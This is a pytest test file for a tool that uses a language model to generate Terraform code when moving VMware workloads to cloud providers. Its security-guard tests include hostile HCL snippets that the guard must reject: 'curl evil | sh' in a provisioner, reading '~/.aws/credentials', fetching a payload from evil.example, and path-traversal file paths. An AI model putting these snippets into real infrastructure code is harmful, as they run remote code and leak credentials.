from __future__ import annotations

import json

import pytest

import hopshift.pipeline.nodes.hcl_generator as hcl_module
from hopshift.cim.schema import (
    NIC,
    CanonicalInfrastructureModel,
    ComputeUnit,
    DistributedSwitch,
    MigrationStatus,
    NetworkTopology,
    PortGroup,
    TargetProvider,
)


class _FakeLLMClient:
    def __init__(self, config: dict[str, object]) -> None:
        self.config = config

    def generate_hcl(self, prompt: str, system_prompt: str | None = None) -> str:
        payload = {
            "aws-migration/networking/vpc.tf": 'resource "aws_vpc" "main" { cidr_block = "10.0.0.0/16" }\nresource "aws_subnet" "main" { vpc_id = aws_vpc.main.id cidr_block = "10.0.1.0/24" }\nresource "aws_security_group" "main" { name = "main" vpc_id = aws_vpc.main.id }',
            "aws-migration/compute/app.tf": 'resource "aws_instance" "app" { ami = "ami-123" instance_type = "t3.medium" subnet_id = aws_subnet.main.id vpc_security_group_ids = [aws_security_group.main.id] }',
        }
        return json.dumps(payload)


def _sample_cim() -> CanonicalInfrastructureModel:
    return CanonicalInfrastructureModel(
        source_vcenter="vc01.local",
        target_provider=TargetProvider.AWS,
        network_topology=NetworkTopology(
            distributed_switches=[
                DistributedSwitch(
                    name="dvs-main",
                    port_groups=[PortGroup(name="pg-app", vlan_id="100")],
                )
            ]
        ),
        compute_units=[
            ComputeUnit(
                id="cu-1",
                name="app-1",
                vcpus=2,
                ram_mb=4096,
                migration_status=MigrationStatus.READY,
            )
        ],
    )


def _empty_cim() -> CanonicalInfrastructureModel:
    return CanonicalInfrastructureModel(
        source_vcenter="vc01.local",
        target_provider=TargetProvider.AWS,
        network_topology=NetworkTopology(distributed_switches=[]),
        compute_units=[],
    )


def _base_state() -> dict[str, object]:
    return {
        "sized_cim": _sample_cim(),
        "config": {
            "generation": {"mode": "llm"},
            "pipeline": {"max_retries": 2},
            "validation": {"run_tflint": False, "run_opa": False},
            "required_tags": {
                "Environment": "dev",
                "Owner": "platform",
                "MigratedFrom": "vmware-vcenter",
            },
        },
        "mcp_context": "provider docs",
        "validation_result": {},
        "messages": [],
        "retry_count": 0,
        "status": "pending",
    }


def test_hcl_generator_retries_until_deterministic_validation_passes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    attempts = {"count": 0}

    def _fake_validate(config: dict[str, object], hcl_output: dict[str, str]) -> dict[str, object]:
        attempts["count"] += 1
        if attempts["count"] == 1:
            return {
                "passed": False,
                "terraform_validate_passed": False,
                "tflint_passed": True,
                "opa_passed": True,
                "errors": ["terraform validate failed"],
                "warnings": [],
            }

        return {
            "passed": True,
            "terraform_validate_passed": True,
            "tflint_passed": True,
            "opa_passed": True,
            "errors": [],
            "warnings": [],
        }

    monkeypatch.setattr(hcl_module, "LLMClient", _FakeLLMClient)
    monkeypatch.setattr(hcl_module, "_deterministic_validate_hcl", _fake_validate)

    updated = hcl_module.hcl_generator(_base_state())  # type: ignore[arg-type]

    assert updated["retry_count"] == 1
    assert updated["validation_result"]["passed"] is True
    assert "aws-migration/modules/networking/main.tf" in updated["hcl_output"]
    assert "aws-migration/networking/vpc.tf" not in updated["hcl_output"]


def test_hcl_generator_exhausts_retries_on_invalid_json(monkeypatch: pytest.MonkeyPatch) -> None:
    class _BadLLMClient:
        def __init__(self, config: dict[str, object]) -> None:
            self.config = config

        def generate_hcl(self, prompt: str, system_prompt: str | None = None) -> str:
            return "not-json"

    monkeypatch.setattr(hcl_module, "LLMClient", _BadLLMClient)

    updated = hcl_module.hcl_generator(_base_state())  # type: ignore[arg-type]

    assert updated["retry_count"] == 2
    assert updated["validation_result"]["passed"] is False
    assert updated["hcl_output"] == {}


def test_hcl_generator_skips_for_empty_workload(monkeypatch: pytest.MonkeyPatch) -> None:
    class _ShouldNotBeCalledLLMClient:
        def __init__(self, config: dict[str, object]) -> None:
            self.config = config

        def generate_hcl(self, prompt: str, system_prompt: str | None = None) -> str:
            raise AssertionError("LLMClient.generate_hcl should not be called for empty workload")

    monkeypatch.setattr(hcl_module, "LLMClient", _ShouldNotBeCalledLLMClient)

    state = _base_state()
    state["sized_cim"] = _empty_cim()  # type: ignore[index]
    state["mcp_context"] = ""

    updated = hcl_module.hcl_generator(state)  # type: ignore[arg-type]

    assert updated["validation_result"]["passed"] is True
    assert updated["hcl_output"] == {}
    assert updated["retry_count"] == 0


def test_hcl_generator_synthesizes_provider_module_layout(monkeypatch: pytest.MonkeyPatch) -> None:
    class _RootlessLLMClient:
        def __init__(self, config: dict[str, object]) -> None:
            self.config = config

        def generate_hcl(self, prompt: str, system_prompt: str | None = None) -> str:
            payload = {
                "aws-migration/networking/vpc.tf": 'resource "aws_vpc" "main" { cidr_block = "10.0.0.0/16" }\nresource "aws_subnet" "main" { vpc_id = aws_vpc.main.id cidr_block = "10.0.1.0/24" }\nresource "aws_security_group" "main" { name = "main" vpc_id = aws_vpc.main.id }',
                "aws-migration/compute/app.tf": 'resource "aws_instance" "app" { ami = "ami-123" instance_type = "t3.medium" subnet_id = aws_subnet.main.id vpc_security_group_ids = [aws_security_group.main.id] }',
            }
            return json.dumps(payload)

    def _always_pass(config: dict[str, object], hcl_output: dict[str, str]) -> dict[str, object]:
        return {
            "passed": True,
            "terraform_validate_passed": True,
            "tflint_passed": True,
            "opa_passed": True,
            "errors": [],
            "warnings": [],
        }

    monkeypatch.setattr(hcl_module, "LLMClient", _RootlessLLMClient)
    monkeypatch.setattr(hcl_module, "_deterministic_validate_hcl", _always_pass)

    updated = hcl_module.hcl_generator(_base_state())  # type: ignore[arg-type]

    assert "aws-migration/main.tf" in updated["hcl_output"]
    main_tf = updated["hcl_output"]["aws-migration/main.tf"]
    assert "module \"networking\"" in main_tf
    assert "module \"compute\"" in main_tf
    assert "ami_id             = var.compute_ami_id" in main_tf
    assert "aws-migration/modules/networking/main.tf" in updated["hcl_output"]
    assert "aws-migration/modules/compute/main.tf" in updated["hcl_output"]

    compute_main = updated["hcl_output"]["aws-migration/modules/compute/main.tf"]
    assert 'data "aws_ssm_parameter" "default_ami"' in compute_main
    assert "trimspace(var.ami_id) != \"\"" in compute_main

    compute_vars = updated["hcl_output"]["aws-migration/modules/compute/variables.tf"]
    assert 'variable "ami_id"' in compute_vars


def test_ensure_runnable_hcl_accepts_azure_minimum_resource_groups() -> None:
    hcl_output = {
        "azure-migration/main.tf": "\n".join(
            [
                'resource "azurerm_virtual_network" "vnet" {}',
                'resource "azurerm_subnet" "subnet" {}',
                'resource "azurerm_network_security_group" "nsg" {}',
                'resource "azurerm_linux_virtual_machine" "vm" {}',
            ]
        )
    }

    hcl_module._ensure_runnable_hcl(provider="azure", hcl_output=hcl_output)


def test_ensure_runnable_hcl_rejects_openstack_missing_security_group() -> None:
    hcl_output = {
        "openstack-migration/main.tf": "\n".join(
            [
                'resource "openstack_networking_network_v2" "net" {}',
                'resource "openstack_networking_subnet_v2" "subnet" {}',
                'resource "openstack_compute_instance_v2" "vm" {}',
            ]
        )
    }

    with pytest.raises(hcl_module.HCLGenerationError, match="missing required resource groups"):
        hcl_module._ensure_runnable_hcl(provider="openstack", hcl_output=hcl_output)


def test_ensure_runnable_hcl_accepts_gcp_without_firewall() -> None:
    hcl_output = {
        "gcp-migration/main.tf": "\n".join(
            [
                'resource "google_compute_network" "vpc" {}',
                'resource "google_compute_subnetwork" "subnet" {}',
                'resource "google_compute_instance" "vm" {}',
            ]
        )
    }

    hcl_module._ensure_runnable_hcl(provider="gcp", hcl_output=hcl_output)


def test_sanitize_supporting_module_removes_duplicate_declarations() -> None:
    content = "\n".join(
        [
            'terraform { required_version = \">= 1.5.0\" }',
            'provider "aws" { region = "us-east-1" }',
            'variable "common_tags" { type = map(string) }',
            'output "x" { value = 1 }',
            'resource "aws_security_group" "sg" {',
            '  name = "sg"',
            '  vpc_id = "vpc-123"',
            '  tags = merge(local.common_tags, { Name = "sg" })',
            '}',
        ]
    )

    sanitized = hcl_module._sanitize_supporting_module(content)

    assert 'variable "common_tags"' not in sanitized
    assert 'provider "aws"' not in sanitized
    assert 'terraform {' not in sanitized
    assert 'output "x"' not in sanitized
    assert 'resource "aws_security_group" "sg"' in sanitized
    assert "merge(var.common_tags," in sanitized


def test_normalize_provider_specific_hcl_strips_unsupported_azure_argument() -> None:
    azure_storage = "\n".join(
        [
            'resource "azurerm_managed_disk" "disk" {',
            '  name                 = "disk1"',
            '  location             = "westeurope"',
            '  resource_group_name  = "rg"',
            '  storage_account_type = "StandardSSD_LRS"',
            '  create_option        = "Empty"',
            '  disk_size_gb         = 64',
            '  encryption_settings_enabled = true',
            '}',
        ]
    )

    updated = hcl_module._normalize_provider_specific_hcl(
        provider="azure",
        hcl_output={"azure-migration/storage/disks.tf": azure_storage},
    )

    assert "encryption_settings_enabled" not in updated["azure-migration/storage/disks.tf"]


def test_normalize_provider_specific_hcl_is_noop_for_aws() -> None:
    hcl_output = {
        "aws-migration/storage/disks.tf": 'resource "aws_ebs_volume" "disk" { encrypted = true }'
    }

    updated = hcl_module._normalize_provider_specific_hcl(provider="aws", hcl_output=hcl_output)

    assert updated == hcl_output


def test_normalize_provider_specific_hcl_strips_openstack_mac_address() -> None:
    openstack_main = "\n".join(
        [
            'resource "openstack_compute_instance_v2" "vm" {',
            '  name = "vm"',
            '  network {',
            '    name        = "net"',
            '    mac_address = "00:0c:29:db:b0:b8"',
            '  }',
            '}',
        ]
    )

    updated = hcl_module._normalize_provider_specific_hcl(
        provider="openstack",
        hcl_output={"openstack-migration/main.tf": openstack_main},
    )

    normalized = updated["openstack-migration/main.tf"]
    assert "mac_address" not in normalized


def test_normalize_provider_specific_hcl_normalizes_gcp_image_and_label_keys() -> None:
    gcp_main = "\n".join(
        [
            'resource "google_compute_disk" "centos_boot" {',
            '  image = "centos-cloud/centos-7"',
            '}',
            '',
            'locals {',
            '  common_tags = {',
            '    Environment = "dev"',
            '    Owner = "platform-team"',
            '    MigratedFrom = "vmware-vcenter"',
            '  }',
            '}',
            '',
            'resource "google_compute_instance" "centos" {',
            '  labels = {',
            '    SourceVCenter = "vc01"',
            '  }',
            '}',
        ]
    )

    updated = hcl_module._normalize_provider_specific_hcl(
        provider="gcp",
        hcl_output={"gcp-migration/main.tf": gcp_main},
    )

    normalized = updated["gcp-migration/main.tf"]
    assert "centos-cloud/centos-7" not in normalized
    assert "rocky-linux-9-optimized-gcp" in normalized
    assert "environment = \"dev\"" in normalized
    assert "owner = \"platform-team\"" in normalized
    assert "migrated_from = \"vmware-vcenter\"" in normalized
    assert "source_v_center = \"vc01\"" in normalized


def test_build_provider_fallback_hcl_for_gcp_emits_deterministic_files() -> None:
    cim = CanonicalInfrastructureModel(
        source_vcenter="vc01.local",
        target_provider=TargetProvider.GCP,
        network_topology=NetworkTopology(
            distributed_switches=[
                DistributedSwitch(
                    name="dvs-main",
                    port_groups=[PortGroup(name="pg-app", vlan_id="100")],
                )
            ]
        ),
        compute_units=[
            ComputeUnit(
                id="cu-1",
                name="app-1",
                vcpus=2,
                ram_mb=4096,
                migration_status=MigrationStatus.READY,
                nics=[NIC(name="nic0", port_group_ref="pg-app")],
            )
        ],
    )

    fallback = hcl_module._build_provider_fallback_hcl(
        provider="gcp",
        sized_cim=cim,
        required_tags={
            "Environment": "dev",
            "Owner": "platform-team",
            "MigratedFrom": "vmware-vcenter",
        },
    )

    assert "gcp-migration/main.tf" in fallback
    assert "gcp-migration/targets.tf" in fallback
    assert "gcp-migration/variables.tf" in fallback
    assert "gcp-migration/networking/vpc.tf" in fallback
    assert "gcp-migration/networking/subnets.tf" in fallback
    assert "gcp-migration/compute/app-1.tf" in fallback

    vpc_tf = fallback["gcp-migration/networking/vpc.tf"]
    assert "google_compute_network_peering_routes_config" not in vpc_tf

    compute_tf = fallback["gcp-migration/compute/app-1.tf"]
    assert "labels = {" in compute_tf
    assert "environment = \"dev\"" in compute_tf
    assert "owner = \"platform-team\"" in compute_tf
    assert "migratedfrom" in compute_tf or "migrated_from" in compute_tf


def test_build_provider_fallback_hcl_is_empty_for_non_gcp() -> None:
    fallback = hcl_module._build_provider_fallback_hcl(
        provider="aws",
        sized_cim=_sample_cim(),
        required_tags={
            "Environment": "dev",
            "Owner": "platform",
            "MigratedFrom": "vmware-vcenter",
        },
    )

    assert fallback == {}


def test_build_provider_fallback_hcl_returns_openstack_files() -> None:
    cim = CanonicalInfrastructureModel(
        source_vcenter="vc01.local",
        target_provider=TargetProvider.OPENSTACK,
        network_topology=NetworkTopology(
            distributed_switches=[
                DistributedSwitch(
                    name="dvs-main",
                    port_groups=[PortGroup(name="pg-app", vlan_id="100")],
                )
            ]
        ),
        compute_units=[
            ComputeUnit(
                id="cu-1",
                name="app-1",
                vcpus=2,
                ram_mb=4096,
                migration_status=MigrationStatus.READY,
                nics=[NIC(name="nic0", port_group_ref="pg-app")],
            )
        ],
    )

    fallback = hcl_module._build_provider_fallback_hcl(
        provider="openstack",
        sized_cim=cim,
        required_tags={
            "Environment": "prod",
            "Owner": "platform-team",
            "MigratedFrom": "vmware-vcenter",
        },
    )

    assert "openstack-migration/networking/vpc.tf" in fallback
    assert "openstack-migration/networking/subnets.tf" in fallback
    assert "openstack-migration/networking/security_groups.tf" in fallback
    assert "openstack-migration/compute/app-1.tf" in fallback
    assert "openstack-migration/storage/app-1_disks.tf" in fallback

    compute_tf = fallback["openstack-migration/compute/app-1.tf"]
    assert "openstack_networking_network_v2.dvs_main.name" in compute_tf


def test_synthesize_provider_runtime_scaffold_for_openstack_adds_provider_and_variables() -> None:
    hcl_output = {
        "openstack-migration/main.tf": '\n'.join(
            [
                "terraform {",
                "  required_providers {",
                "    openstack = { source = \"hashicorp/openstack\" }",
                "  }",
                "}",
                "",
                'provider "openstack" {',
                '  auth_url = "https://example.invalid"',
                "}",
                "",
                'resource "openstack_networking_network_v2" "net" {}',
                'resource "openstack_networking_subnet_v2" "subnet" {}',
                'resource "openstack_networking_secgroup_v2" "sg" {}',
                'resource "openstack_compute_instance_v2" "vm" {}',
            ]
        )
        + "\n",
        "openstack-migration/compute/main.tf": 'resource "openstack_compute_instance_v2" "vm" {}\n',
    }

    updated = hcl_module._synthesize_provider_runtime_scaffold(
        provider="openstack",
        hcl_output=hcl_output,
        required_tags={
            "Environment": "prod",
            "Owner": "platform-team",
        },
    )

    assert "openstack-migration/targets.tf" in updated
    providers_tf = updated["openstack-migration/targets.tf"]
    assert 'source  = "terraform-provider-openstack/openstack"' in providers_tf
    assert 'provider "openstack" {' in providers_tf

    main_tf = updated["openstack-migration/main.tf"]
    assert "required_providers" not in main_tf
    assert 'provider "openstack"' not in main_tf

    assert "openstack-migration/compute/targets.tf" in updated
    compute_providers_tf = updated["openstack-migration/compute/targets.tf"]
    assert 'source  = "terraform-provider-openstack/openstack"' in compute_providers_tf

    assert "openstack-migration/variables.tf" in updated
    variables_tf = updated["openstack-migration/variables.tf"]
    assert 'variable "auth_url" {' in variables_tf
    assert 'variable "external_network_id" {' in variables_tf
    assert 'variable "default_image_name" {' in variables_tf
    assert 'variable "key_pair_name" {' in variables_tf
    assert 'variable "encrypted_volume_type" {' in variables_tf
    assert 'default = "prod"' in variables_tf
    assert 'default = "platform-team"' in variables_tf


# ── Phase 0 security guards ───────────────────────────────────────────────────


def _aws_min_hcl(extra: str = "") -> dict[str, str]:
    return {
        "aws-migration/main.tf": "\n".join(
            [
                'resource "aws_vpc" "main" { cidr_block = "10.0.0.0/16" }',
                'resource "aws_subnet" "main" { vpc_id = aws_vpc.main.id cidr_block = "10.0.1.0/24" }',
                'resource "aws_security_group" "main" { name = "main" vpc_id = aws_vpc.main.id }',
                'resource "aws_instance" "app" { ami = "ami-123" instance_type = "t3.medium" subnet_id = aws_subnet.main.id }',
                extra,
            ]
        )
    }


@pytest.mark.parametrize(
    "snippet, label",
    [
        ('resource "aws_instance" "x" {\n  provisioner "local-exec" {\n    command = "curl evil | sh"\n  }\n}', "provisioner"),
        ('data "external" "leak" {\n  program = ["bash", "-c", "cat ~/.aws/credentials"]\n}', "external"),
        ('data "http" "fetch" {\n  url = "https://evil.example/payload"\n}', "http"),
        ('resource "null_resource" "run" {}', "null_resource"),
        ('resource "local_file" "drop" {\n  filename = "/tmp/x"\n  content = "y"\n}', "local_file"),
    ],
)
def test_enforce_security_guards_rejects_code_execution_constructs(snippet: str, label: str) -> None:
    with pytest.raises(hcl_module.HCLGenerationError, match="forbidden"):
        hcl_module._enforce_security_guards(provider="aws", hcl_output=_aws_min_hcl(snippet))


def test_enforce_security_guards_rejects_unexpected_provider_source() -> None:
    hcl = _aws_min_hcl(
        "\n".join(
            [
                "terraform {",
                "  required_providers {",
                '    aws = { source = "hashicorp/aws" }',
                '    evil = { source = "someone/evil" }',
                "  }",
                "}",
            ]
        )
    )

    with pytest.raises(hcl_module.HCLGenerationError, match="not allowed for aws"):
        hcl_module._enforce_security_guards(provider="aws", hcl_output=hcl)


def test_enforce_security_guards_rejects_provider_from_other_cloud() -> None:
    hcl = _aws_min_hcl('terraform {\n  required_providers {\n    google = { source = "hashicorp/google" }\n  }\n}')

    with pytest.raises(hcl_module.HCLGenerationError, match="not allowed for aws"):
        hcl_module._enforce_security_guards(provider="aws", hcl_output=hcl)


@pytest.mark.parametrize(
    "source",
    [
        "terraform-aws-modules/vpc/aws",
        "git::https://example.com/modules.git",
        "../outside",
        "./modules/../../escape",
    ],
)
def test_enforce_security_guards_rejects_remote_or_escaping_module_sources(source: str) -> None:
    hcl = _aws_min_hcl(f'module "net" {{\n  source = "{source}"\n}}')

    with pytest.raises(hcl_module.HCLGenerationError):
        hcl_module._enforce_security_guards(provider="aws", hcl_output=hcl)


def test_enforce_security_guards_accepts_allowlisted_sources() -> None:
    hcl = _aws_min_hcl(
        "\n".join(
            [
                "terraform {",
                "  required_providers {",
                '    aws    = { source = "hashicorp/aws" }',
                '    random = { source = "registry.terraform.io/hashicorp/random" }',
                "  }",
                "}",
                'module "networking" {',
                '  source = "./modules/networking"',
                "}",
                'resource "azurerm_linux_virtual_machine" "vm" {',
                "  source_image_reference {",
                '    publisher = "Canonical"',
                "  }",
                "}",
            ]
        )
    )

    hcl_module._enforce_security_guards(provider="aws", hcl_output=hcl)


@pytest.mark.parametrize(
    "path",
    [
        "aws-migration/compute/../../escape.tf",
        "/etc/aws-migration/compute/x.tf",
        "aws-migration\\compute\\..\\..\\escape.tf",
    ],
)
def test_validate_output_paths_rejects_traversal_and_absolute(path: str) -> None:
    with pytest.raises(hcl_module.HCLGenerationError):
        hcl_module._validate_output_paths(provider="aws", hcl_output={path: "# x"})


def test_hcl_generator_allows_empty_mcp_context_when_mcp_disabled(monkeypatch: pytest.MonkeyPatch) -> None:
    def _always_pass(config: dict[str, object], hcl_output: dict[str, str]) -> dict[str, object]:
        return {
            "passed": True,
            "terraform_validate_passed": True,
            "tflint_passed": True,
            "opa_passed": True,
            "errors": [],
            "warnings": [],
        }

    monkeypatch.setattr(hcl_module, "LLMClient", _FakeLLMClient)
    monkeypatch.setattr(hcl_module, "_deterministic_validate_hcl", _always_pass)

    state = _base_state()
    state["mcp_context"] = ""
    state["config"]["mcp"] = {"enabled": False}  # type: ignore[index]

    updated = hcl_module.hcl_generator(state)  # type: ignore[arg-type]

    assert updated["validation_result"]["passed"] is True
    assert updated["hcl_output"]


def test_hcl_generator_requires_mcp_context_when_mcp_enabled(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(hcl_module, "LLMClient", _FakeLLMClient)

    state = _base_state()
    state["mcp_context"] = ""

    with pytest.raises(hcl_module.HCLGenerationError, match="MCP documentation context is required"):
        hcl_module.hcl_generator(state)  # type: ignore[arg-type]


def test_hcl_generator_feeds_back_traversal_paths_instead_of_crashing(monkeypatch: pytest.MonkeyPatch) -> None:
    class _TraversalLLMClient:
        def __init__(self, config: dict[str, object]) -> None:
            self.config = config

        def generate_hcl(self, prompt: str, system_prompt: str | None = None) -> str:
            return json.dumps({"aws-migration/compute/../../escape.tf": 'resource "aws_vpc" "x" {}'})

    monkeypatch.setattr(hcl_module, "LLMClient", _TraversalLLMClient)

    updated = hcl_module.hcl_generator(_base_state())  # type: ignore[arg-type]

    assert updated["validation_result"]["passed"] is False
    assert updated["hcl_output"] == {}
    assert any("unsafe output path" in message for message in updated["messages"])


# ── batched, structured LLM generation ───────────────────────────────────────


def test_parse_hcl_output_accepts_structured_files_shape() -> None:
    parsed = hcl_module._parse_hcl_output(
        {"files": [{"path": "aws-migration/main.tf", "content": "x"}, {"path": "aws-migration/compute/a.tf", "content": "y"}]}
    )
    assert parsed == {"aws-migration/main.tf": "x", "aws-migration/compute/a.tf": "y"}


def test_parse_hcl_output_rejects_duplicate_paths() -> None:
    with pytest.raises(hcl_module.HCLGenerationError, match="duplicate"):
        hcl_module._parse_hcl_output({"files": [{"path": "a.tf", "content": "1"}, {"path": "a.tf", "content": "2"}]})


def test_llm_generation_batches_large_estates(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[tuple[str, list[str] | None]] = []

    class _StructuredLLM:
        last_usage = None

        def __init__(self, config: dict[str, object]) -> None:
            self.config = config

        def generate_structured(self, prompt, json_schema, system_prompt=None, stable_prefix=None, schema_name="x"):
            assert json_schema is hcl_module.HCL_FILES_SCHEMA
            assert "CIM JSON" in (stable_prefix or "")
            if "ONLY the shared files" in prompt:
                calls.append(("shared", None))
                return {"files": [
                    {"path": "aws-migration/networking/vpc.tf", "content": 'resource "aws_vpc" "main" {}\nresource "aws_subnet" "main" {}\nresource "aws_security_group" "main" {}'},
                ]}
            ids = prompt.split("ComputeUnit ids: ")[1].split(".")[0].split(", ")
            calls.append(("compute", ids))
            assert "aws_vpc.main" in prompt  # existing resources are passed to compute batches
            return {"files": [{"path": f"aws-migration/compute/{unit_id}.tf", "content": f'resource "aws_instance" "{unit_id.replace("-", "_")}" {{}}'} for unit_id in ids]}

        def usage_summary(self) -> str:
            return "calls=3"

    def _always_pass(config, hcl_output):
        return {"passed": True, "terraform_validate_passed": True, "tflint_passed": True, "opa_passed": True, "errors": [], "warnings": []}

    monkeypatch.setattr(hcl_module, "LLMClient", _StructuredLLM)
    monkeypatch.setattr(hcl_module, "_deterministic_validate_hcl", _always_pass)

    state = _base_state()
    cim = state["sized_cim"]
    cim.compute_units = [
        ComputeUnit(id=f"cu-{index}", name=f"app-{index}", vcpus=2, ram_mb=4096) for index in range(1, 6)
    ]
    state["config"]["pipeline"]["batch_size"] = 2  # type: ignore[index]

    updated = hcl_module.hcl_generator(state)  # type: ignore[arg-type]

    assert updated["validation_result"]["passed"] is True
    assert [scope for scope, _ in calls] == ["shared", "compute", "compute", "compute"]
    assert [ids for _, ids in calls][1:] == [["cu-1", "cu-2"], ["cu-3", "cu-4"], ["cu-5"]]
    assert any("llm usage total" in message for message in updated["messages"])


def test_llm_truncation_halves_batch_and_retries(monkeypatch: pytest.MonkeyPatch) -> None:
    from hopshift.pipeline.llm_client import LLMTruncatedError


    class _TruncatingLLM:
        last_usage = None
        attempts = 0

        def __init__(self, config: dict[str, object]) -> None:
            pass

        def generate_structured(self, prompt, json_schema, system_prompt=None, stable_prefix=None, schema_name="x"):
            _TruncatingLLM.attempts += 1
            if _TruncatingLLM.attempts == 1:
                raise LLMTruncatedError("hit max_tokens")
            return {"files": [
                {"path": "aws-migration/networking/vpc.tf", "content": 'resource "aws_vpc" "main" {}\nresource "aws_subnet" "main" {}\nresource "aws_security_group" "main" {}'},
                {"path": "aws-migration/compute/app.tf", "content": 'resource "aws_instance" "app" {}'},
            ]}

    def _always_pass(config, hcl_output):
        return {"passed": True, "terraform_validate_passed": True, "tflint_passed": True, "opa_passed": True, "errors": [], "warnings": []}

    monkeypatch.setattr(hcl_module, "LLMClient", _TruncatingLLM)
    monkeypatch.setattr(hcl_module, "_deterministic_validate_hcl", _always_pass)

    updated = hcl_module.hcl_generator(_base_state())  # type: ignore[arg-type]

    assert updated["validation_result"]["passed"] is True
    assert updated["retry_count"] == 1
    assert any("batch_size reduced" in message for message in updated["messages"])
